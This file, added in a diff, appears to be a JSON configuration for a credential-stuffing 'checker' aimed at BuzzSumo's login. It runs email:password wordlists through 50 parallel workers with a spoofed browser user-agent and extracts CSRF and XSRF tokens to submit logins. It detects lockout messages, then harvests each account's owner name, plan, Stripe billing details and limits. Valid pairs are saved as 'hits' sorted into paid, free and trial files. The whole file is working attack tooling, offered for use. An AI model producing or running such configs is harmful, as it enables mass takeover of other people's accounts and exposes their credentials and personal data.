@@ -1,0 +1,227 @@
+{
+  "id": "buzzsumo",
+  "name": "BuzzSumo",
+  "description": "Inertia JSON login — built from ONF network.ndjson (app.buzzsumo.com)",
+  "source_capture": "task_20260613_203330",
+  "settings": {
+    "workers": 50,
+    "timeout_seconds": 30,
+    "retry_on_error": 1
+  },
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+  "credentials": {
+    "separator": ":",
+    "email_field": "email",
+    "password_field": "password"
+  },
+  "variables": {
+    "base_url": "https://app.buzzsumo.com",
+    "login_url": "https://app.buzzsumo.com/login",
+    "account_query_url": "https://app.buzzsumo.com/resource/account/query",
+    "segment_traits_url": "https://app.buzzsumo.com/users/segment-traits"
+  },
+  "steps": [
+    {
+      "id": "login_page",
+      "name": "Load login page (Inertia + cookies)",
+      "method": "GET",
+      "url": "{{login_url}}",
+      "headers": {
+        "Accept": "text/html, application/xhtml+xml",
+        "Accept-Language": "en-US,en;q=0.9",
+        "User-Agent": "{{user_agent}}"
+      },
+      "extract": {
+        "inertia_version": {
+          "source": "json_body",
+          "path": "version"
+        },
+        "csrf_token": {
+          "source": "json_body",
+          "path": "props.csrf_token"
+        },
+        "xsrf_token": {
+          "source": "cookie",
+          "name": "XSRF-TOKEN",
+          "transform": "url_decode"
+        }
+      }
+    },
+    {
+      "id": "login_post",
+      "name": "Submit credentials (Inertia POST)",
+      "method": "POST",
+      "url": "{{login_url}}",
+      "headers": {
+        "Accept": "text/html, application/xhtml+xml",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/json",
+        "Origin": "{{base_url}}",
+        "Referer": "{{login_url}}",
+        "X-Inertia": "true",
+        "X-Inertia-Version": "{{inertia_version}}",
+        "X-Requested-With": "XMLHttpRequest",
+        "X-XSRF-TOKEN": "{{xsrf_token}}",
+        "User-Agent": "{{user_agent}}"
+      },
+      "body": "{\"email\":\"{{email}}\",\"password\":\"{{password}}\"}",
+      "failure_signals": {
+        "status_codes": [401, 419, 422, 429],
+        "body_contains": [
+          "Invalid email or password",
+          "invalid email",
+          "These credentials do not match",
+          "Too many attempts",
+          "account locked"
+        ]
+      }
+    },
+    {
+      "id": "account_query",
+      "name": "Fetch account + active plan",
+      "method": "GET",
+      "url": "{{account_query_url}}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Referer": "{{base_url}}/",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "{{user_agent}}"
+      },
+      "success_status": [200],
+      "extract": {
+        "account_email": {
+          "source": "json_body",
+          "path": "0.email"
+        },
+        "first_name": {
+          "source": "json_body",
+          "path": "0.first_name"
+        },
+        "last_name": {
+          "source": "json_body",
+          "path": "0.last_name"
+        },
+        "plan_name": {
+          "source": "json_body",
+          "path": "0.account.plan.name"
+        },
+        "plan_id": {
+          "source": "json_body",
+          "path": "0.account.plan_id"
+        },
+        "stripe_plan_id": {
+          "source": "json_body",
+          "path": "0.account.plan.stripe_plan_id"
+        },
+        "plan_interval": {
+          "source": "json_body",
+          "path": "0.account.stripe_subscription_interval"
+        },
+        "billing_cycle_started_at": {
+          "source": "json_body",
+          "path": "0.account.billing_cycle_started_at"
+        },
+        "has_pro_features": {
+          "source": "json_body",
+          "path": "0.account.plan.has_pro_features"
+        },
+        "has_pro_plus_features": {
+          "source": "json_body",
+          "path": "0.account.plan.has_pro_plus_features"
+        },
+        "has_agency_features": {
+          "source": "json_body",
+          "path": "0.account.plan.has_agency_features"
+        },
+        "has_enterprise_features": {
+          "source": "json_body",
+          "path": "0.account.plan.has_enterprise_features"
+        },
+        "searches_limit": {
+          "source": "json_body",
+          "path": "0.account.plan.pricing_limits.plan_limit.searches"
+        },
+        "alerts_limit": {
+          "source": "json_body",
+          "path": "0.account.plan.pricing_limits.plan_limit.alerts"
+        }
+      }
+    },
+    {
+      "id": "segment_traits",
+      "name": "Backup plan name (Segment traits)",
+      "optional": true,
+      "method": "GET",
+      "url": "{{segment_traits_url}}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Cache-Control": "no-cache",
+        "Referer": "{{base_url}}/",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "{{user_agent}}"
+      },
+      "extract": {
+        "segment_plan_name": {
+          "source": "json_body",
+          "path": "userTraits.plan_name"
+        },
+        "segment_plan_id": {
+          "source": "json_body",
+          "path": "userTraits.plan_id"
+        }
+      }
+    }
+  ],
+  "validation": {
+    "hit": {
+      "step": "account_query",
+      "status": 200,
+      "require_extract": ["plan_name", "account_email"]
+    },
+    "fail": {
+      "any_step_failure_signal": true,
+      "account_query_unauthorized": [401, 403]
+    }
+  },
+  "plan_labels": {
+    "free_trial": {
+      "match": {
+        "stripe_plan_id": "free_trial"
+      },
+      "label": "FREE_TRIAL"
+    },
+    "free": {
+      "match": {
+        "plan_name_contains": "Free"
+      },
+      "label": "FREE"
+    },
+    "paid": {
+      "match": {
+        "stripe_plan_id_not": "free_trial"
+      },
+      "label": "PAID"
+    }
+  },
+  "output": {
+    "hit_line": "{{email}}:{{password}} | Plan={{plan_name}} | PlanID={{plan_id}} | Stripe={{stripe_plan_id}} | Interval={{plan_interval}} | Label={{plan_label}} | Name={{first_name}} {{last_name}}",
+    "console_hit": "[HIT] {{email}} | Active Plan: {{plan_name}} ({{plan_label}}) | stripe={{stripe_plan_id}} | limits: searches={{searches_limit}} alerts={{alerts_limit}}",
+    "console_fail": "[FAIL] {{email}} | {{reason}}",
+    "files": {
+      "hits": "results/hits.txt",
+      "hits_by_plan": "results/by_plan/{{plan_label}}.txt",
+      "paid": "results/paid.txt",
+      "free_trial": "results/free_trial.txt",
+      "invalid": "results/invalid.txt"
+    }
+  },
+  "notes": [
+    "Step 1: GET /login returns HTML shell with data-page JSON (version + csrf_token) and sets XSRF-TOKEN + session_buzzsumo cookies.",
+    "Step 2: POST /login with JSON body and X-Inertia headers.",
+    "Step 3: GET /resource/account/query returns account.plan.name = active plan (e.g. Free Trial, Pro, Enterprise).",
+    "plan_name at 0.account.plan.name is the primary active plan field.",
+    "Use email:password wordlist; run with -workers 50 for parallel checks."
+  ]
+}
